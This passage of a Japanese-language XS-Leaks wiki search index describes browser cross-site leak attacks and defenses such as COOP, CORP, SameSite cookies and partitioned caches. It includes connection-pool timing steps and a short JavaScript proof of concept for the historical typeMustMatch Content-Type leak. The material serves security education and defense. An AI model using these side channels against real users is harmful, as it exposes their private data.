ここでランダムなトークンが活用できます。 もし実装されていれば、アプリケーションは読み込みのたびに /user/\u0026lt;USERNAME\u0026gt;.png？cache_buster=\u0026lt;RANDOM_TOKEN\u0026gt; からユーザのプロフィール写真を取得します。
サーバは、このランダムなトークンに対して何も行う必要はありません。 これは純粋に、攻撃者がランダムなトークンを知らないためにキャッシュを調査できないことを、実現するためだけのものとなります。
もっと丁寧に実装するのであれば、アプリケーションがページの読み込みに渡って再利用することができるユーザ固有のランダムなトークンを持つこともできます。
これにより、特定のユーザに対してURLが一定に保たれるため、サブリソースをキャッシュすることができます。
メリット：
すべての主要なブラウザでサポートされている キャッシングを阻害しない デメリット：
実装が難しい Fetch Metadataによるキャッシュ保護 # Fetch-Metadata は、クライアント側でリクエストが開始された方法と理由をサーバが判断できるようにすることを目的としています。 公開される情報の1つは、リクエストが同じオリジンからのものか、別のオリジンからのものかを指定するSec-Fetch-Site ヘッダです。 Varyヘッダと組み合わせることで、リクエストが同じオリジンから行われたか、異なるオリジンから行われたかに基づいて、ブラウザにキャッシュをセグメント化させることができます。
これは、保護したいすべてのリソースに Vary: Sec-Fetch-Site を設定することで実現できます。
example
cache probing 攻撃から保護したいリソースcdn.example.com/image.pngがあると仮定します。 Vary：Sec-Fetch-Siteを設定すると、以下のように動作します。
example.comがリソースを読み込もうとすると、リクエストは同じサイトによって開始されるため、(SFS: same-site, resource_url)にキャッシュされます。 cdn.example.comがリソースを読み込もうとすると、リクエストは同じオリジンによって開始されるため、(SFS: same-origin, resource_url)にキャッシュされます。 evil.comがリソースを読み込もうとすると、リクエストは別のサイトによって開始されるため、(SFS: cross-site, resource_url)にキャッシュされます。 ※Vary：Sec-Fetch-SiteをSFSと省略して記載しています。
これは、クロスサイトリクエストが同一サイトおよび同一生成元のリクエストから分離されることを意味することに注意してください。
メリット：
キャッシングを阻害しない デメリット：
Fetch Metadataは、新しい標準であり、現在Chromiumベースのブラウザ（ChromeやEdgeなど）でのみサポートされている ページに読み込まれたクロスサイトのサブリソースは保護されない（例：CDNからのサブリソース） サードパーティがリソースを読み込む場合には、保護されない `}),e.add({id:36,href:"/docs/attacks/timing-attacks/connection-pool/",title:"Connection Pool",section:"Timing Attacks",content:`network timingを測定する方法の一つとして、ブラウザのソケットプールを悪用する方法があります。 ブラウザはサーバと通信するために、ソケットを利用します。 ハードウェアやその上で動作するOSのリソースには限りがあるため、ブラウザにも制限をかけざるを得ません。
この制限の存在を悪用するために、攻撃者は下記のようなことができます。
ブラウザの制限を確認する。 単に接続をハングアップさせる \\(255\\) のリクエストを別々のホストに実行して、長時間 \\(255\\) のソケットをブロックする。 ターゲットページに対するリクエストを実行して、 \\(256^{番目}\\) のソケットを利用する。 他のホストへの \\(257^{番目}\\) のリクエストを実行します。(step2、3で)すべてのソケットが使用されているので、このリクエストは、プールが利用可能なソケットを受け取るまで待機する必要があります。この待ち時間は、ターゲットページに属する \\(256^{番目}\\) のソケットのネットワークタイミングを、攻撃者に提供します。これが動作するのは、ステップ2の \\(255\\) 個のソケットがまだブロックされているので、ステップ3のソケットの解放によってプールが利用可能なソケットを受信した場合です。 \\(256^{番目}\\) のソケットを解放する時間は、リクエストを完了するのにかかった時間と直結しています。 対策 # SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ❌ ❌ ❌ ❌ info
partitioned cachesと同様に、リソースの\u0026quot;site/originごとの分割\u0026quot;の原理をソケットプールに拡張することを、いくつかのブラウザが検討しています。 参考文献 # `}),e.add({id:37,href:"/docs/attacks/historical/content-type/",title:"Content-Type",section:"Historical",content:"リクエストのContent-Typeをリークすることで、攻撃者は2つのリクエストを区別できるようになります。\ntypeMustMatch # typeMustMatchはobject要素のtypeMustMatch属性を反映したブール値です。これは、オブジェクトを読み込む際に、リソースのContent-Typeがオブジェクトで提供されるものと同じかどうかを検証することで、特定の MIME タイプを強制しなければならないことを保証します。残念ながら、この強制は攻撃者がウェブサイトから返されるContent-Typeとステータスコードを漏らすことも可能にします 1。\n根本的な原因 # 以下のスニペットを考えると、https://target/api で返された Content-Type が type のものと一致しない場合や、サーバが 200 以外のステータスを返した場合には、 not_loaded がレンダリングされるでしょう。\n\u0026lt;object type=\u0026#34;application/json\u0026#34; data=\u0026#34;https://example.org\u0026#34; typemustmatch\u0026gt; not_loaded \u0026lt;/object\u0026gt; 問題 # 攻撃者は、すべての条件が満たされたときに起こるオブジェクトのレンダリングを検出することによって、ウェブサイトのContent-Typeとステータスコードをリークできます。攻撃者は、(ステータスコード200で)オブジェクトがレンダリングされるとき、0ではないであろうclientHeightとclientWidthの値をチェックできます。typeMustMatchはリソースを読み込む際に、サーバーがステータス200を返すことを要求するので、Error Events XS-Leaksと同様にエラーページを検出することが可能でしょう。\n以下の例では、iframe内にオブジェクトを埋め込み、iframeがonloadイベントをトリガーしたときにclientHeightとclientWidthの値をチェックすることでこの動作を検出する方法を示しています。\n// 配送先のWebサイトのURLを設定する var url = \u0026#39;https://example.org\u0026#39;; // チェックしたいコンテンツタイプ var mime = \u0026#39;application/json\u0026#39;; var ifr = document.createElement(\u0026#39;iframe\u0026#39;); // オブジェクトがonloadイベントを発生させないので、iframe内にオブジェクトをロードする。 ifr.srcdoc = ` \u0026lt;object id=\u0026#34;obj\u0026#34; type=\u0026#34;${mime}\u0026#34; data=\u0026#34;${url}\u0026#34; typemustmatch\u0026gt; error \u0026lt;/object\u0026gt;`; document.body.appendChild(ifr); // iframeが読み込まれたら、オブジェクトの高さを読み取ります。 // もしそれが一行のテキストの高さであれば、リソースのContent Typeは`application/json`ではなかったということです。 // もしそうでなければ、それは`application/json`だったということです。 ifr.onload = () =\u0026gt; { console.log(ifr.contentWindow.obj.clientHeight) }; 修正 # Firefox は typeMustMatch 属性をサポートする唯一のブラウザでした 2 が、他のブラウザがサポートを提供しなかったため、バージョン 68で削除され、HTML Living Standard からも削除されました。\n参考文献 # Cross-Site Content and Status Types Leakage, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nRemove support for typemustmatch, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"}),e.add({id:38,href:"/docs/defenses/secure-defaults/corb/",title:"Cross-Origin Read Blocking",section:"Secure Defaults",content:`Cross-Origin Read Blocking (CORB)は、攻撃者が特定のクロスオリジンのリソースを読み込むことを防ぐセキュリティ機構です1。 この保護機構は、攻撃者がクロスサイトのページ（attacker.com と sensitive.com など）が埋め込まれたプロセスのメモリを読み取れるようにするSpectreなどの投機的なサイドチャネル攻撃から保護するために作成されました。 CORBは、攻撃者が特定の機密性の高いクロスオリジンのリソースを攻撃者が制御するプロセスに読み込むのを防ぐことを目的としています。 たとえば、攻撃者がクロスオリジンのHTML、XML、JSONを imgタグに読み込もうとしようとすると、CORBはこれを阻止します。 CORBを使用すると、サーバがデータを返さなかったかのように処理されます。
リソースを分類するために、CORBは Content-Typeヘッダ、 nosniffヘッダ、およびその他のさまざまなヒューリスティックを使用します。
info
Cross-Origin Resource Policy (CORP)は、CORB を適用・拡張するオプトインの保護です。 CORBを使用するときは、以下の点に注意してください。
現在はChromiumベースのブラウザのみがCORBをサポートしています。 CORBは、ナビゲーショナルリクエストに対して保護しません。つまり、プロセス外のiframeをサポートしないブラウザでは、framing protectionsが使用されていない場合、CORBで保護されたリソースは別のオリジンのプロセスで終了する可能性があります。 CORBは、攻撃者がCORBの結果を観察できる可能性があるため、new XS-Leak 手法を引き入れており、これによってさまざまな情報のリークが発生する可能性があります。 ただし、ほとんどの場合、これらのリークは投機的実行攻撃によってリークされる可能性のあるデータよりも影響は小さいものでしょう。 参考文献 # Cross-Origin Read Blocking for Web Developers, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:39,href:"/docs/defenses/opt-in/coop/",title:"Cross-Origin-Opener-Policy",section:"Opt-In Mechanisms",content:`ウェブサイトの window オブジェクトにアクセスすることは、さまざまな XS-Leak 手法にとって共通の前提条件です。 Framing Protections は、攻撃者が window オブジェクトにアクセスするために iframe を使用できないようにすることができますが、 window.open(url) や window.opener の参照を通して開かれたウィンドウから、 window オブジェクトにアクセスすることを止めることはできません。
XS-Leaks を window.open で悪用することは、一般的に攻撃者にとって最も魅力のない方法と考えられています。なぜなら、ユーザーは開いているブラウザウィンドウでそれが起こるのを見ることができるからです。しかし、次のような場合には、正しい方法です。
Framing Protectionsがセットされている Same-Site Cookies with Lax Mode がセットされている(Strict モードとは対照的に，Lax モードではトップレベルのウィンドウを移動することができます) 他のウェブサイトがページへの任意のウィンドウ参照を得ることを防ぐために、アプリケーションは Cross-Origin-Opener-Policy (COOP) 1 2 を展開することができます。
COOPヘッダーには3つの値があります。
unsafe-none - これはデフォルトの値で、値が設定されていない場合にウェブサイトがどのように振る舞うかを示しています。 same-origin - これは最も厳しい値です。same-origin を設定すると、クロスオリジンのウェブサイトは新しいウィンドウを開いて window オブジェクトにアクセスすることができなくなります。もし、アプリケーションが window.open を使って別のウェブサイトを開いて通信することに依存している場合、same-origin によってブロックされます。これが問題になる場合は、代わりに same-origin-allow-popups を設定してください。 same-origin-allow-popups - この値はあなたのウェブサイトが window.open を使用することを許可しますが、他のウェブサイトがあなたのアプリケーションに対して window.open を使用することは許可されません。 可能であれば、same-originを設定することをお勧めします。same-origin-allow-popups を設定した場合は、 window.open で開くウェブサイトを確認し、そのウェブサイトが信頼できるものであることを確認するようにしてください。
考慮事項 # COOP はオプトインのメカニズムであり、非常に新しいものなので、開発者やセキュリティエンジニアは簡単に見落としてしまいます。 それでもこの防御メカニズムは重要です。 なぜなら、攻撃者が window.open のような API が返すウィンドウ参照を利用する XS-Leak を悪用するのを防ぐ唯一の方法だからです（Strict モードの SameSite Cookie が広く展開されない限り）。
デプロイメント # web.devの記事で、このプロテクションの利点と導入方法について詳しく説明しています。
参考文献 # Cross-Origin-Opener-Policy response header (also known as COOP), link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Cross-Origin-Opener-Policy, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:40,href:"/docs/defenses/opt-in/corp/",title:"Cross-Origin-Resource-Policy",section:"Opt-In Mechanisms",content:`Cross-Origin Resource Policy（CORP）は、Webプラットフォームのセキュリティ機能であり、Webサイトが特定のリソースを他のオリジンによってロードされるのを防ぐことができます。 この保護はオプトイン防御であるためCORBを補完しますが、CORBはデフォルトで一部のクロスオリジン読み取りをブロックします。 CORPは、開発者が攻撃者によって制御されるプロセスに機密リソースが到達しないようにすることで、投機的実行攻撃とXSリークの両方から保護するように設計されています。 CORBとは異なり、この保護は、アプリケーションが保護をオプトインした場合にのみブラウザーに適用されます。 アプリケーションは、どのオリジンのグループ(\u0026lsquo;same-site\u0026rsquo;,\u0026lsquo;same-origin\u0026rsquo;, \u0026lsquo;cross-site\u0026rsquo;)がリソースの読み取りを許可されるかを定義できます。
アプリケーションが特定のリソースCORPヘッダーを「same-site」または「same-origin」として設定した場合、攻撃者はそのリソースを読み取ることができません。これは非常に強力で、推奨される保護です。
CORPを使用するときは、次の点に注意してください。
CORPはナビゲーションリクエストに対して保護しません。 つまり、プロセス外のiframeをサポートしていないブラウザでは、CORPで保護されたリソースは、[Framing protections]（https://xsleaks.dev/docs/defenses/opt-in/xfo/）は使用されていない場合、他のオリジンのプロセスで終了する可能性があります。 CORPを使用すると、[a new XS-Leak]（https://xsleaks.dev/docs/attacks/browser-features/corp/）も付随し、攻撃者はあるリクエストでCORPが実施されたかどうかを検出することができます。 参考文献 # `}),e.add({id:41,href:"/docs/defenses/opt-in/xfo/",title:"Framing Protections",section:"Opt-In Mechanisms",content:`相当数のXS-Leaksがiframeのいくつかの特性に依存しています。もし攻撃者がページのコンテンツを iframe、frame、embed または object として埋め込むことができなければ、もはや攻撃は不可能になるかもしれません。これらのコンテンツに依存するXS-Leaksを軽減するために、ページはどのオリジンがそれらを埋め込むことができるかを禁じたり、あるいは選択したりすることができます。これは、X-Frame-Options header や CSP frame-ancestors directive を使用することで可能になります。
Framing Protections を適用したウェブサイトは、攻撃者のオリジンから埋め込むことができないため、コンテンツはレンダリングされず、JavaScript は実行されません。したがって、そのサブリソース（画像、JS、CSSなど）はいずれもブラウザによって取得できません。
tip
CSP frame-ancestors directiveは、フレーミング保護を有効にする、より現代的な方法です。しかし、Internet Explorer ではサポートされていないので、多くの場合、X-Frame-Options Header と組み合わせて使うことが推奨されます。 Considerations # この保護機能は rely on framing のXS-Leaksに対して非常に有効であり、大多数のアプリケーションに対して容易に非破壊で実装することができます。この仕組みは、一部のXS-Leakを防ぐだけでなく、clickjackingのような攻撃も防ぐことができます。
Deployment # 通常、多くのアプリケーションは iframe 内にクロスオリジンで埋め込まれることを意図していないので、フレーミング保護を導入することは簡単です。このヘッダの利点については、この web.dev の記事を参照してください。
`}),e.add({id:42,href:"/docs/defenses/secure-defaults/partitioned-cache/",title:"Partitioned HTTP Cache",section:"Secure Defaults",content:`cache probing攻撃を対策するために、ブラウザ開発者は、各Webサイトが個別のキャッシュを持つようにするパーティション化されたHTTPキャッシュ機能の実装に積極的に取り組んでいます。 cache probingは、ブラウザのHTTPキャッシュがすべてのWebサイトで共有されるという事実に依存しているため、パーティション化されたHTTPキャッシュは、多くのcache probingの手法を対策できます。 これは、キャッシュが要求元のサイトによってパーティショニングされていることを確認するためのキャッシュキーとして、firefox 1のようなタプル（(top-frame-site, resource-url) または chromium/chrome 2 のような (top-frame-site, framing-site, resource-url) ）を使って行われます。 これにより、攻撃者が異なるサイトのキャッシュされたコンテンツを操作することがより困難になります 3 4 5。 Safariは現在、パーティション化されたキャッシュを搭載しています6。
tip
パーティション化されたキャッシュを使用しないブラウザの場合、アプリケーションがcache probing技術を対策するために展開できるother defensesがあります。 また、cache probing攻撃を対策するために、あるレベルのユーザインタラクションを必要とするように designed することも可能です。 その他の関連プロジェクト # WebKitのトラッキング防止技術 # Safari は (top-frame-site, resource URL) をキャッシュキーとして使用するパーティション化された HTTP キャッシュを実装しています。 これは、WebKit のより大きな Tracking Prevention プロジェクトの一部です。
FirefoxのFirst Party Isolation # First Party Isolationは、Firefoxの browser extension で、ドメインごとにクッキーや永続的なデータ（キャッシュなど）へのアクセスを制限するものです。 これには、ユーザ側でのオプトインが必要です。
考察 # パーティション化されたHTTPキャッシュは、いずれすべてのブラウザに搭載されるであろう有望なセキュリティ機能です。 これらのパーティショニング戦略は、ブラウザのキャッシュを活用するXS-Leakの手法のほとんどを軽減します。 将来的には、パーティション化されたキャッシュは他のブラウザリソースに拡張され、Socket Exhaustion XS-Leak などの他のXS-Leak手法の対策にも役立つかもしれません。
参考文献 # Top-level site partitioning (Gecko), link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Split Disk Cache Meta Bug (Blink), link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Double-keyed HTTP cache, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Explainer - Partition the HTTP Cache, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Client-Side Storage Partitioning, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Optionally partition cache to prevent using cache for tracking (Webkit), link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:43,href:"/docs/attacks/experiments/portals/",title:"Portals",section:"Experiments",content:`Portals は、iframeに似ていますが、スピードとユーザーエクスペリエンスをより重視したウェブの新しい機能です。portal要素は、Chromiumベースのブラウザーで、プリファレンス・フラグの下でのみ利用可能です。対応する仕様は現在も活発に議論されています。
残念ながら、この新機能の研究により、新たなXS-Leaksを含むいくつかの重大な問題が発見されました1。
ID Leaks # Portalsは、ID Attribute XS-Leakの代わりとして悪用される可能性があります。Webサイトがframing protectionsを設定している場合、Portals 要素を代わりに利用することで同じ手法を適用することができます2。
参考文献 # Security analysis of \u0026lt;portal\u0026gt; element, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Detecting IDs using Portal, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:44,href:"/docs/defenses/opt-in/same-site-cookies/",title:"SameSite Cookies",section:"Opt-In Mechanisms",content:`SameSite Cookieは、クロスサイトリクエストを含むセキュリティ問題を修正するための、最もインパクトのある最新のセキュリティ機構の一つです。この機構によって、アプリケーションはブラウザに、同じサイト 1で発行されたリクエストにのみCookieを含めるように強制することができます。 SameSite Cookieには、None、Lax、Strict の 3 つのモードがあります。
SameSite Cookieのモード # SameSite Cookieのモードは以下の通りです。
None – SameSite Cookieによるすべての保護機能を無効化し、Cookieの旧来の動作に戻します。このモードは推奨されません。 important
None 属性を設定するには、そのCookieに Secure 属性を付与しなければなりません。 [^1] Strict – ブラウザがクロスサイトリクエストにCookieを含めないようにします。これは、 \u0026lt;script src=\u0026quot;example.com/resource\u0026quot;\u0026gt;, \u0026lt;img src=\u0026quot;example.com/resource\u0026quot;\u0026gt;, fetch()、や XHR が元になるリクエストには Strict モードのCookieを付けずに送信します。 たとえユーザが example.com/resource のリンクをクリックしたとしてもそのリクエストにCookieは含まれません。
Lax – LaxとStrictの唯一の違いは、Laxモードではトップレベルの遷移によって発生するクロスサイトリクエストにはCookieを付けることができるということです。Lax モードはアプリケーションへの導線リンクを破壊しないため、設定がより簡単になります。残念ながら、攻撃者はwindow.open を通じてトップレベルの遷移を引き起こすことができ、それによって攻撃者はwindowオブジェクトへの参照を維持することができます。
考察 # StrictモードのCookieは最強のセキュリティ保護を提供しますが、既存のアプリケーションにStrictモードのSameSite Cookieを設定することは難しいでしょう。
SameSite Cookieは防弾でもなければ 2、すべてを解決できる技術ではありません。XS-Leaksに対するこの防御戦略を完全なものにするために、アプリケーションは他の追加的な防御を実装することを検討するべきです。例えば、COOP は Lax モードの SameSite Cookieが使われたとしても、最初のナビゲーション以降、攻撃者が window 参照を使ってページをコントロールするのを防ぐことができます。
important
ブラウザによっては、Cookieのデフォルト動作としてLaxモードを使用しない場合があるので、SameSite属性を明示的に設定し、確実に実行されるようにしてください。 Google Chromeのデフォルトでは、SameSite属性を持たないCookieはLaxモードがデフォルトの動作になります。しかし、POSTリクエストで送信される際、設定されてから2分未満のCookieについては例外的にクロスサイトであってもCookieが付与されます。1
Cookies default to SameSite=Lax, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
実装 # この機構をWebアプリケーションに導入することに興味がある場合は web.dev の記事を見てください。
参考資料 # SameSite cookies explained, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Bypass SameSite Cookies Default to Lax and get CSRF, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:45,href:"/docs/attacks/experiments/scroll-to-text-fragment/",title:"Scroll to Text Fragment",section:"Experiments",content:`Scroll to Text Fragment (STTF) は、ユーザーがウェブページのテキストの任意の部分へのリンクを作成できるWebプラットフォームの新機能です。フラグメント#:~:text=は、ブラウザによって強調表示されてビューポートに取り込まれるテキストスニペットを運びます。この機能は、攻撃者がこの動作の発生を検出できることで、新しいXS-Leakをもたらします。この問題は、Scroll to CSS SelectorのXS-Leakに非常によく似ています。
期待される課題・議論される課題 # この機能の仕様に関する初期の議論では、単純な実装でいくつかのXS-Leakをもたらせることが示されました1。この仕様では、様々な攻撃シナリオ2が考慮されており、Googleの研究結果も同様です3。この機能を実装する際、ブラウザが注意すべきXS-Leakの可能性の1つは、以下の通りです。
攻撃者は、ページをiframeとして埋め込むことで、親ドキュメントのonblurイベントを聞くことによって、ページがテキストにスクロールされたかどうかを検出することができます。この方法は、ID Attribute XS-Leakと類似しています。このシナリオは、Chromeの実装4では、トップレベルのナビゲーションで発生するフラグメントナビゲーションのみを許可しているため、緩和されています。 現在の課題 # warning
これらのXS-Leaksは、ターゲットページに何らかのマークアップを注入する必要があります。 STTFの開発過程で、フラグメントナビゲーションを検出するための新しい攻撃やトリックが発見されました。そのうちのいくつかは今でも有効です。
攻撃者が制御するiframeを埋め込んだWebページでは、テキストへのスクロールが発生したかどうかを攻撃者が判断することができるかもしれません。これは、IntersectionObserverAPIを使用して行うことができます5 2 3。 ページがレイジーローディングで画像を含む場合、攻撃者は画像が[ブラウザにキャッシュ]cached in the browserされているかどうかをチェックすることで、画像を含むフラグメントナビゲーションが発生したかどうかを検出することができます。これは、レイジーローディングの画像は、ビューポートに表示されたときにのみ取得（およびキャッシュ）されるため、機能します。 important
Scroll to Text Fragmentは、Chromeでのみ利用可能です。仕様書ドラフトは現在検討中です。 info
Scroll to Text Fragment XS-Leaksでは、ページ上に1つの単語が存在するかどうかを観察し、ユーザーがページに対して何らかの操作（例：マウスクリック）を行った場合にのみ、攻撃者は一度に1ビットの情報を抽出することが可能です。 なぜ問題なのか？ # 攻撃者はSTTFを悪用して、Webページに表示されるユーザーの個人情報を漏えいさせることができます。
事例シナリオ # あるユーザが国民健康保険制度のWebサイトにログインしており、そこでユーザの過去の病気や健康問題についての情報にアクセスすることが可能でした。攻撃者はユーザーをそのページの一つに誘い込み、STTFを使用してユーザーの健康状態の詳細を推測できる可能性があります。例えば、ある病名で検索した際に、ページスクロールを検知すると、その病名が被害者の病気であることを知ることができます。
対策 # Document Policies SameSite Cookies (Lax) COOP Framing Protections Isolation Policies ✔️ ✔️ ❌ ✔️ RIP 🔗 NIP 参考文献 # Privacy concerns with proposal through inducing network requests, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Text Fragments - Security and Privacy, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Scroll-to-text Fragment Navigation - Security Issues, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Boldly link where no one has linked before: Text Fragments, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Possible side-channel information leak using IntersectionObserver, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:46,href:"/docs/attacks/historical/stateful-browser-features/",title:"Stateful Browser Features",section:"Historical",content:`ブラウザの機能/拡張の中には、ブラウザによって生成された特定のウェブサイトの状態に応じて、リクエストの処理方法を変更するものがあります。攻撃者は、時に、このプロセス全体を観察し、ブラウザを混乱させ、これらの状態に対して副作用をもたらすアクションを引き起こすことができます。
WebKit – ITP # Intelligent Tracking Prevention (ITP) は、WebKit Tracking Prevention technologies の一部であるプライバシー機能です。これは、いくつかの機能を組み合わせたもので、ウェブサイトが第三者のコンテキストの下でユーザーを追跡することを防ぐことを目的としています。残念ながら、残念ながら、初期の設計では新しいXS-Leak1が登場し、ITPが暗黙的に作り出した状態を攻撃者が悪用して、ウェブサイトをトラッカーとすることができました。
根本的な原因 # ITPは、Webサイトにトラッキング機能があるかどうかを分類するために、リソースの負荷や、クリック、タップ、テキスト入力など、Webサイトに対するユーザーのインタラクションに関する統計情報を収集しています。ITPは、これらの統計情報を分類し、トラッキング機能があると思われるWebサイトにはストライクを与えます。3回ストライクを受けると、そのウェブサイトは拒否リストに登録され、今後のリクエストの際にブラウザによって扱いが変更されます。
問題 # ITPの問題の1つは、攻撃者がITPを操作して、特定の動作を任意に強制できることです。たとえば、攻撃者はITPを操作して、あるドメインにストライクを与え、そのドメイ ンが拒否リストに入ったかどうかをチェックすることができます。この情報は、たとえば次のようなさまざまな方法で活用することができます。
ドメインが拒否リストに入るために必要なストライクの数に基づいて、ユーザーのブラウジング習慣をリークします。 拒否リストを利用して、結果があるときだけクロスサイトリソースを取り込むページに対してXS-Search攻撃を実行します。 修正 # この問題を修正するため、ITPは分類をやめ、すべてのサイトをデフォルトで「トラッキング」サイトと見なすようになりました。これにより、攻撃者が特定のITPの動作を検出することを可能にしていた暗黙的状況がなくなりました。
参考文献 # Information Leaks via Safari’s Intelligent Tracking Prevention, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`}),e.add({id:47,href:"/docs/defenses/design-protections/subresource-protections/",title:"Subresource Protections",section:"Application Design",content:`サブリソースを保護する設計の基本的な考え方は、攻撃者がサブリソースにユーザデータを返させることができなければ、サブリソースはXS-Leakの対象とはならないということです。 正しく実装されている場合、このアプローチは非常に強力な対策となりますが、実装が難しく、ユーザ体験に悪影響を与える可能性があります。
tip
XS-Leakに特に注意すべきと認識している特定のリソースに、このアプローチを展開することは非常に効果的です。 ただし、この保護を一般的に展開するのは難しいため、アプリケーションはデフォルトのアプローチとして opt-in web platform security featuresを展開することを推奨します。 トークンベースの保護 # サブリソースの強力な保護は、すべてのリクエストにユーザ固有のトークンを含めることで実現できます。 これは、正しく実装されていれば、ほとんどのXS-Leakの手法から保護されます。 リソースのリクエストが正当であると検証するために、トークンを含めなければならないという考え方です。 なお、このトークンは攻撃者が自分のリクエストに含めることができないように、クライアントに提供しなければなりません。
example
アプリケーションに検索バーがあるとします。
ユーザがメインページを読み込むと、サーバはページの本文のどこかに安全なトークンを含めます。 ユーザが何かを検索すると、/search?query=\u0026lt;QUERY\u0026gt;\u0026amp;token=\u0026lt;SECURE_TOKEN\u0026gt;にリクエストが送信されます。 バックエンドにて、受け取ったトークンが現在のユーザに対して有効であることを確認します。 有効でない場合には、リクエストが拒否されます。 このシナリオでは、攻撃者は、特定のユーザにおいて有効なトークンを取得できないため、エンドポイント対してリクエストを送信させる方法がありません。 これは、攻撃者が他のユーザのトークンを取得または偽造できないことに、依存することに注意してください。 もしそれが可能であれば、このアプローチは有効ではありません。
このスタイルの保護は、次の用途に適用できます。
APIエンドポイントや一般的な認証されたURLなどの認証済みのサブリソース。この場合、トークンも利用できますが、Same-Site Cookies などのセキュリティ緩和策の方が、大規模に展開しやすいかもしれません。 画像などの認証されていないサブリソースは、一部のタイプの Cache Probing Attacks を対策するためにこの保護を利用できます。これは有効ですが、cache probing攻撃を対策する他の戦略については Cache Protections を参照してください。 warning
トークンベースの保護を実装すると、ユーザがリンク（ブックマークなど）を保存したり共有する機能が損なわれる可能性があります。 ユーザの同意 # もう1つの強力な対策は、機密データを返す前にユーザの操作を要求することです。 これにより、機密性の高いエンドポイントは、scriptまたはimgタグを介して含めることができなくなります。 たとえば、Facebookでは、検索結果やプライベートメッセージを表示する前にユーザの確認が必要です。 攻撃者はこのユーザとの対話を再現できないため、検索結果の内容をリークさせることはできません。
これは、特に機密性の高いエンドポイントを保護するために非常に有効な方法ですが、実装に時間がかかる可能性があることに注意してください。
`}),e.add({id:48,href:"/docs/defenses/opt-in/document-policies/",title:"Document Policies",section:"Opt-In Mechanisms",content:`Document-Policyは、別の実験的な機能ポリシー1と同様の実験的なメカニズムであり、ドキュメントの構成やドキュメント、フレームからの機能の削除（サンドボックス化）に関する機能をカバーするために使用されます。2 たとえば、次の例に示すように、レスポンスヘッダーに設定できます。
example
Document-Policy: unsized-media=?0, document-write=?0, max-image-bpp=2.0, frame-loading=lazy ForceLoadAtTop # ForceLoadAtTop機能は、プライバシーに配慮したサイトに対して、Scroll To Text (と他のload-on-scroll動作) のオプトアウト機能を提供します。 この機能により、サイトは常にページの一番上に読み込まれ、テキストフラグメントやエレメントフラグメントを含むあらゆるscroll-on-loadの動作をブロックすることを示すことができます。 この機能は Document-Policy: force-load-at-top レスポンスヘッダーで設定することができます。
この機能は ID Attribute や Scroll to Text Fragment などの攻撃を防止するために有用です。
References # Document-Policy proposal, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
Feature Policy, link\u0026#160;\u0026#x21a9;\u0026#xfe0e;
`})})()